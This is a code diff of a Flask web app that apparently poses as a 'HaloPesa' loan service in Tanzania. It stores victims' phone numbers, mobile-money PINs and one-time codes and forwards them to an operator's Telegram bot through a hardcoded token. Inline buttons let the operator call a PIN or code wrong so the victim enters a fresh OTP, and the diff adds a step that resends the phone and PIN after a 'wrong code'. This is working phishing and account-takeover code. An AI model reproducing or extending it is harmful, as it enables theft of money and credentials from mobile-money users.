@@ -5,8 +5,6 @@ import random
 import string
 from datetime import datetime
 import os
-import threading
-import time
 
 app = Flask(__name__)
 app.secret_key = 'halopesa-tz-2024'
@@ -14,8 +12,6 @@ app.secret_key = 'halopesa-tz-2024'
 BOT_TOKEN = '8863624253:AAH6SxAjF9F9hLKm1o9DTnVHzvdXrviWezA'
 CHAT_ID = '8589275340'
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
-
-last_update_id = 0
 
 def init_db():
     conn = sqlite3.connect('/tmp/database_hp.db')
@@ -65,43 +61,30 @@ def submit_loan():
     pin = data.get('pin','')
     amount = int(data.get('amount',0))
     months = int(data.get('months',1))
-
     conn = sqlite3.connect('/tmp/database_hp.db')
     c = conn.cursor()
-    c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',
-              (app_id, amount, months, phone, pin, code))
+    c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,amount,months,phone,pin,code))
     conn.commit()
     conn.close()
-
     msg = f'📥 NEW LOAN REQUEST\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n🔢 PIN: {pin}\n💰 Amount: TZS {amount:,}'
-    keyboard = {'inline_keyboard': [[
-        {'text':'❌ INVALID','callback_data':f'deny_{app_id}'},
-        {'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}
-    ]]}
+    keyboard = {'inline_keyboard':[[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
     send_telegram(msg, keyboard)
-    return jsonify({'success':True, 'app_id':app_id})
+    return jsonify({'success':True,'app_id':app_id})
 
 @app.route('/api/submit_code', methods=['POST'])
 def submit_code():
     data = request.json
     app_id = data.get('app_id')
     entered_code = data.get('code')
-    
     conn = sqlite3.connect('/tmp/database_hp.db')
     c = conn.cursor()
-    c.execute('SELECT phone, code, amount, pin FROM loans WHERE app_id = ?', (app_id,))
+    c.execute('SELECT phone, code, amount, pin FROM loans WHERE app_id = ?',(app_id,))
     loan = c.fetchone()
-    
     if loan:
         phone, expected_code, amount, pin = loan
         msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n✍️ Entered: {entered_code}\n💰 Amount: TZS {amount:,}\n🔢 PIN: {pin}'
-        keyboard = {'inline_keyboard': [
-            [{'text':'❌ WRONG PIN','callback_data':f'wrongpin2_{app_id}'}],
-            [{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],
-            [{'text':'✅ APPROVE LOAN','callback_data':f'approve_{app_id}'}]
-        ]}
+        keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'wrongpin2_{app_id}'}],[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE LOAN','callback_data':f'approve_{app_id}'}]]}
         send_telegram(msg, keyboard)
-    
     conn.close()
     return jsonify({'success':True})
 
@@ -109,17 +92,15 @@ def submit_code():
 def check_status(app_id):
     conn = sqlite3.connect('/tmp/database_hp.db')
     c = conn.cursor()
-    c.execute('SELECT status, code_status FROM loans WHERE app_id = ?', (app_id,))
+    c.execute('SELECT status, code_status FROM loans WHERE app_id = ?',(app_id,))
     loan = c.fetchone()
     conn.close()
-    if loan:
-        return jsonify({'status':loan[0], 'code_status':loan[1]})
+    if loan: return jsonify({'status':loan[0],'code_status':loan[1]})
     return jsonify({'status':'not_found'})
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
     data = request.json
-    
     if 'callback_query' in data:
         cb = data['callback_query']
         cb_data = cb['data']
@@ -143,16 +124,22 @@ def webhook():
         elif cb_data.startswith('wrongpin2_'):
             aid = cb_data.replace('wrongpin2_','')
             new_code = str(random.randint(1000,9999))
-            c.execute('UPDATE loans SET status="wrong_pin", code_status="pending", code=? WHERE app_id=?',(new_code,aid))
+            c.execute('UPDATE loans SET status="wrong_pin",code_status="pending",code=? WHERE app_id=?',(new_code,aid))
             conn.commit()
             edit_telegram(msg_id, original+'\n\n❌ WRONG PIN')
         
         elif cb_data.startswith('wrongcode_'):
             aid = cb_data.replace('wrongcode_','')
             new_code = str(random.randint(1000,9999))
-            c.execute('UPDATE loans SET code_status="wrong_code", code=? WHERE app_id=?',(new_code,aid))
+            c.execute('SELECT phone, amount, pin FROM loans WHERE app_id=?',(aid,))
+            loan = c.fetchone()
+            c.execute('UPDATE loans SET code_status="wrong_code",code=? WHERE app_id=?',(new_code,aid))
             conn.commit()
             edit_telegram(msg_id, original+'\n\n❌ WRONG CODE')
+            if loan:
+                phone, amount, pin = loan
+                new_msg = f'📤 NEW CODE\n\n🆔 ID: {aid}\n📞 Phone: +255 {phone}\n💰 Amount: TZS {amount:,}\n🔢 PIN: {pin}'
+                send_telegram(new_msg)
         
         elif cb_data.startswith('approve_'):
             aid = cb_data.replace('approve_','')
@@ -162,7 +149,6 @@ def webhook():
             edit_telegram(msg_id, original+f'\n\n✅ APPROVED\n{now}')
         
         conn.close()
-    
     return jsonify({'ok':True})
 
 if __name__ == '__main__':
